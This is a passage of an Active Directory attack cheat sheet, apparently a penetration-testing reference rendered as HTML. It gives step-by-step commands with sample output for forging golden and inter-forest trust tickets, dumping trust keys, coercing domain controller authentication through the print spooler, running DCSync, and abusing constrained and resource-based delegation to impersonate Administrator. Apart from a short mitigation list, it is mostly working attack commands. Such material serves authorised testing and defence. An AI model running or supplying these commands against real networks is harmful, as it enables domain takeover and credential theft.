</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">kerberos::golden</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/krbtgt:HASH_KRBTGT</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w"> </span><span class="nx">/sid:S-1-5-21-2941561648-383941485-1389968811</span><span class="w"> </span><span class="nx">/sids:S-1-5-SID-SECOND-DOMAIN-519</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h3 id="forest-to-forest-compromise---trust-ticket">Forest to Forest Compromise - Trust Ticket</h3>

<ul>
  <li>Require: SID filtering disabled</li>
</ul>

<p>From the DC, dump the hash of the <code class="language-plaintext highlighter-rouge">currentdomain\targetdomain$</code> trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using 
Mimikatz, adding the SID for the target domain’s enterprise admins group to our <strong>SID history</strong>.</p>

<h4 id="dumping-trust-passwords-trust-keys">Dumping trust passwords (trust keys)</h4>

<blockquote>
  <p>Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing <strong>$</strong> are computer accounts, but some are trust accounts.</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">lsadump::trust</span><span class="w"> </span><span class="nx">/patch</span><span class="w">

</span><span class="n">or</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">TRUST_NAME</span><span class="err">$</span><span class="w"> </span><span class="nx">machine</span><span class="w"> </span><span class="nx">account</span><span class="w"> </span><span class="nx">hash</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="create-a-forged-trust-ticket-inter-realm-tgt-using-mimikatz">Create a forged trust ticket (inter-realm TGT) using Mimikatz</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span><span class="w"> </span><span class="c"># kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi</span><span class="w">
</span><span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span><span class="w"> </span><span class="c"># kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="use-the-trust-ticket-file-to-get-a-tgs-for-the-targeted-service">Use the Trust Ticket file to get a TGS for the targeted service</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="o">.</span><span class="n">\asktgs.exe</span><span class="w"> </span><span class="nx">c:\temp\trust.kirbi</span><span class="w"> </span><span class="nx">CIFS/machine.domain.local</span><span class="w">
</span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:c:\ad\tools\mcorp-ticket.kirbi</span><span class="w"> </span><span class="nx">/service:LDAP/mcorp-dc.moneycorp.local</span><span class="w"> </span><span class="nx">/dc:mcorp-dc.moneycorp.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Inject the TGS file and access the targeted service with the spoofed rights.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">kirbikator</span><span class="w"> </span><span class="nx">lsa</span><span class="w"> </span><span class="o">.</span><span class="nx">\ticket.kirbi</span><span class="w">
</span><span class="n">ls</span><span class="w"> </span><span class="nx">\\machine.domain.local\c</span><span class="err">$</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="kerberos-unconstrained-delegation">Kerberos Unconstrained Delegation</h3>

<blockquote>
  <p>The user sends a TGS to access the service, along with their TGT, and then the service can use the user’s TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</p>
</blockquote>

<blockquote>
  <p>When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user’s TGT ticket gets saved to that computer’s memory.</p>
</blockquote>

<p>:warning: Unconstrained delegation used to be the only option available in Windows 2000</p>

<h4 id="spoolservice-abuse-with-unconstrained-delegation">SpoolService Abuse with Unconstrained Delegation</h4>

<p>The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.</p>

<p><strong>Requirements</strong>:</p>
<ul>
  <li>Object with Property <strong>Trust this computer for delegation to any service (Kerberos only)</strong></li>
  <li>Must have <strong>ADS_UF_TRUSTED_FOR_DELEGATION</strong></li>
  <li>Must not have <strong>ADS_UF_NOT_DELEGATED</strong> flag</li>
  <li>User must not be in the <strong>Protected Users</strong> group</li>
  <li>User must not have the flag <strong>Account is sensitive and cannot be delegated</strong></li>
</ul>

<h5 id="find-delegation">Find delegation</h5>

<p>:warning: : Domain controllers usually have unconstrained delegation enabled.  <br />
Check the <code class="language-plaintext highlighter-rouge">TrustedForDelegation</code> property.</p>

<ul>
  <li><a href="https://github.com/samratashok/ADModule">ADModule</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c"># From https://github.com/samratashok/ADModule</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">TrustedForDelegation</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$True</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="err">$&gt;</span><span class="w"> </span><span class="n">ldapdomaindump</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"DOMAIN\\Account"</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s2">"Password123*"</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w">   
</span><span class="n">grep</span><span class="w"> </span><span class="nx">TRUSTED_FOR_DELEGATION</span><span class="w"> </span><span class="nx">domain_computers.grep</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki">CrackMapExec module</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">cme</span><span class="w"> </span><span class="nx">ldap</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nt">--trusted-for-delegation</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h5 id="spoolservice-status">SpoolService status</h5>

<p>Check if the spool service is running on the remote host</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">ls</span><span class="w"> </span><span class="nx">\\dc01\pipe\spoolss</span><span class="w">
</span><span class="n">python</span><span class="w"> </span><span class="nx">rpcdump.py</span><span class="w"> </span><span class="nx">DOMAIN/user:password</span><span class="err">@</span><span class="nx">10.10.10.10</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h5 id="monitor-with-rubeus">Monitor with Rubeus</h5>

<p>Monitor incoming connections from Rubeus.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">monitor</span><span class="w"> </span><span class="nx">/interval:1</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>

<h5 id="force-a-connect-back-from-the-dc">Force a connect back from the DC</h5>

<p>Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.</p>

<blockquote>
  <p>SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a “feature” in the MS-RPRN RPC interface.</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c"># From https://github.com/leechristensen/SpoolSample</span><span class="w">
</span><span class="o">.</span><span class="n">\SpoolSample.exe</span><span class="w"> </span><span class="nx">VICTIM-DC-NAME</span><span class="w"> </span><span class="nx">UNCONSTRAINED-SERVER-DC-NAME</span><span class="w">
</span><span class="o">.</span><span class="n">\SpoolSample.exe</span><span class="w"> </span><span class="nx">DC01.HACKER.LAB</span><span class="w"> </span><span class="nx">HELPDESK.HACKER.LAB</span><span class="w">
</span><span class="c"># DC01.HACKER.LAB is the domain controller we want to compromise</span><span class="w">
</span><span class="c"># HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.</span><span class="w">

</span><span class="c"># From https://github.com/dirkjanm/krbrelayx</span><span class="w">
</span><span class="n">printerbug.py</span><span class="w"> </span><span class="s1">'domain/username:password'</span><span class="err">@&lt;</span><span class="nx">VICTIM-DC-NAME</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">UNCONSTRAINED-SERVER-DC-NAME</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689</span><span class="w">
</span><span class="n">python</span><span class="w"> </span><span class="nx">dementor.py</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">UNCONSTRAINED-SERVER-DC-NAME</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">VICTIM-DC-NAME</span><span class="err">&gt;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>If the attack worked you should get a TGT of the domain controller.</p>

<h5 id="load-the-ticket">Load the ticket</h5>

<p>Extract the base64 TGT from Rubeus output and load it to our current session.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:</span><span class="err">&lt;</span><span class="nx">ticket</span><span class="w"> </span><span class="nx">base64</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Alternatively you could also grab the ticket using Mimikatz :  <code class="language-plaintext highlighter-rouge">mimikatz # sekurlsa::tickets</code></p>

<p>Then you can use DCsync or another attack : <code class="language-plaintext highlighter-rouge">mimikatz # lsadump::dcsync /user:HACKER\krbtgt</code></p>

<h5 id="mitigation">Mitigation</h5>

<ul>
  <li>Ensure sensitive accounts cannot be delegated</li>
  <li>Disable the Print Spooler Service</li>
</ul>

<h3 id="kerberos-constrained-delegation">Kerberos Constrained Delegation</h3>

<blockquote>
  <p>Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,</p>
</blockquote>

<p>Passing the -impersonate flag and specifying the user we wish to impersonate (any valid username).</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="c"># Discover</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-TrustedToAuth</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-exp</span><span class="w"> </span><span class="nx">dnshostname</span><span class="w">

</span><span class="c"># Find the service </span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nx">previous_result</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-exp</span><span class="w"> </span><span class="nx">msds-AllowedToDelegateTo</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="exploit-with-impacket">Exploit with Impacket</h4>
<pre><code class="language-ps1">$ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
</code></pre>

<h4 id="exploit-with-rubeus">Exploit with Rubeus</h4>
<pre><code class="language-ps1">$ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
$ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
$ dir \\dc.domain.com\c$
</code></pre>

<h4 id="impersonate-a-domain-user-on-a-resource">Impersonate a domain user on a resource</h4>

<p>Require:</p>
<ul>
  <li>SYSTEM level privileges on a machine configured with constrained delegation</li>
</ul>

<pre><code class="language-ps1">PS&gt; [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
PS&gt; $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
PS&gt; $idToImpersonate.Impersonate()
PS&gt; [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
PS&gt; ls \\dc01.offense.local\c$
</code></pre>

<h3 id="kerberos-resource-based-constrained-delegation">Kerberos Resource Based Constrained Delegation</h3>

<p>Resource-based Constrained Delegation was introduced in Windows Server 2012.</p>

<blockquote>
  <p>The user sends a TGS to access the service (“Service A”), and if the service is allowed to delegate to another pre-defined service (“Service B”), then Service A can present to the authentication service the TGS that the user provided and obtain a TGS for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</p>
</blockquote>

<ol>
  <li>
    <p>Import <strong>Powermad</strong> and <strong>Powerview</strong></p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">PowerShell.exe</span><span class="w"> </span><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w">
 </span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\powermad.ps1</span><span class="w">
 </span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\powerview.ps1</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Get user SID</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="nv">$AttackerSID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nx">SvcJoinComputerToDom</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">objectsid</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Expand</span><span class="w"> </span><span class="nx">objectsid</span><span class="w">
 </span><span class="nv">$ACE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-DomainObjectACL</span><span class="w"> </span><span class="nx">dc01-ww2.factory.lan</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="nv">$AttackerSID</span><span class="p">}</span><span class="w">
 </span><span class="nv">$ACE</span><span class="w">
 </span><span class="n">ConvertFrom-SID</span><span class="w"> </span><span class="nv">$ACE</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Abuse <strong>MachineAccountQuota</strong> to create a computer account and set an SPN for it</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">New-MachineAccount</span><span class="w"> </span><span class="nt">-MachineAccount</span><span class="w"> </span><span class="nx">swktest</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Weakest123*'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Rewrite DC’s <strong>AllowedToActOnBehalfOfOtherIdentity</strong> properties</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="nv">$ComputerSid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nx">swktest</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">objectsid</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Expand</span><span class="w"> </span><span class="nx">objectsid</span><span class="w">
 </span><span class="nv">$SD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Security.AccessControl.RawSecurityDescriptor</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="si">$(</span><span class="nv">$ComputerSid</span><span class="si">)</span><span class="s2">)"</span><span class="w">
 </span><span class="nv">$SDBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">byte</span><span class="p">[]</span><span class="w"> </span><span class="p">(</span><span class="nv">$SD</span><span class="o">.</span><span class="nf">BinaryLength</span><span class="p">)</span><span class="w">
 </span><span class="nv">$SD</span><span class="o">.</span><span class="nf">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">)</span><span class="w">
 </span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nx">dc01-ww2.factory.lan</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Set</span><span class="w"> </span><span class="p">@{</span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="o">=</span><span class="nv">$SDBytes</span><span class="p">}</span><span class="w">
 </span><span class="nv">$RawBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nx">dc01-ww2.factory.lan</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-expand</span><span class="w"> </span><span class="nx">msds-allowedtoactonbehalfofotheridentity</span><span class="w">
 </span><span class="nv">$Descriptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Security.AccessControl.RawSecurityDescriptor</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="nv">$RawBytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="w">
 </span><span class="nv">$Descriptor</span><span class="o">.</span><span class="nf">DiscretionaryAcl</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>

    <pre><code class="language-ps1"> # alternative
 $SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

 # alternative
 StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND
</code></pre>
  </li>
  <li>
    <p>Use Rubeus to get hash from password</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="nx">/password:</span><span class="s1">'Weakest123*'</span><span class="w"> </span><span class="nx">/user:swktest</span><span class="err">$</span><span class="w">  </span><span class="nx">/domain:factory.lan</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Input</span><span class="w"> </span><span class="nx">password</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">Weakest123</span><span class="o">*</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Input</span><span class="w"> </span><span class="nx">username</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">swktest</span><span class="err">$</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Input</span><span class="w"> </span><span class="nx">domain</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">factory.lan</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Salt</span><span class="w">                       </span><span class="p">:</span><span class="w"> </span><span class="nx">FACTORY.LANswktest</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w">       </span><span class="n">rc4_hmac</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">F8E064CA98539B735600714A1F1907DD</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w">       </span><span class="n">aes128_cts_hmac_sha1</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">D45DEADECB703CFE3774F2AA20DB9498</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w">       </span><span class="n">aes256_cts_hmac_sha1</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w">       </span><span class="n">des_cbc_md5</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">BA297CFD07E62A5E</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Impersonate domain admin using our newly created machine account</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:swktest</span><span class="err">$</span><span class="w"> </span><span class="nx">/rc4:F8E064CA98539B735600714A1F1907DD</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/msdsspn:cifs/dc01-ww2.factory.lan</span><span class="w"> </span><span class="nx">/ptt</span><span class="w"> </span><span class="nx">/altservice:cifs</span><span class="p">,</span><span class="nx">http</span><span class="p">,</span><span class="nx">host</span><span class="p">,</span><span class="nx">rpcss</span><span class="p">,</span><span class="nx">wsman</span><span class="p">,</span><span class="nx">ldap</span><span class="w">
 </span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:swktest</span><span class="err">$</span><span class="w"> </span><span class="nx">/aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/msdsspn:cifs/dc01-ww2.factory.lan</span><span class="w"> </span><span class="nx">/ptt</span><span class="w"> </span><span class="nx">/altservice:cifs</span><span class="p">,</span><span class="nx">http</span><span class="p">,</span><span class="nx">host</span><span class="p">,</span><span class="nx">rpcss</span><span class="p">,</span><span class="nx">wsman</span><span class="p">,</span><span class="nx">ldap</span><span class="w">

 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Impersonating</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="s1">'Administrator'</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">SPN</span><span class="w"> </span><span class="s1">'cifs/dc01-ww2.factory.lan'</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="kr">Using</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="nx">controller:</span><span class="w"> </span><span class="nx">DC01-WW2.factory.lan</span><span class="w"> </span><span class="p">(</span><span class="mf">172.16</span><span class="o">.</span><span class="nf">42</span><span class="o">.</span><span class="nf">5</span><span class="p">)</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Building</span><span class="w"> </span><span class="nx">S4U2proxy</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">service:</span><span class="w"> </span><span class="s1">'cifs/dc01-ww2.factory.lan'</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Sending</span><span class="w"> </span><span class="nx">S4U2proxy</span><span class="w"> </span><span class="nx">request</span><span class="w">
 </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">S4U2proxy</span><span class="w"> </span><span class="nx">success</span><span class="o">!</span><span class="w">
 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">base64</span><span class="p">(</span><span class="n">ticket.kirbi</span><span class="p">)</span><span class="w"> </span><span class="kr">for</span><span class="w"> </span><span class="n">SPN</span><span class="w"> </span><span class="s1">'cifs/dc01-ww2.factory.lan'</span><span class="p">:</span><span class="w">

     </span><span class="n">doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD</span><span class="w">
     </span><span class="nx">AgECoR4wHBsEY2lmcxsUZGMwMS</span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="nx">PMIIFC6ADAgESoQMCAQOiggT9BIIE</span><span class="w">
     </span><span class="n">LmZhY3RvcnkubGFu</span><span class="w">

 </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Action:</span><span class="w"> </span><span class="nx">Import</span><span class="w"> </span><span class="nx">Ticket</span><span class="w">
 </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Ticket</span><span class="w"> </span><span class="nx">successfully</span><span class="w"> </span><span class="nx">imported</span><span class="o">!</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ol>

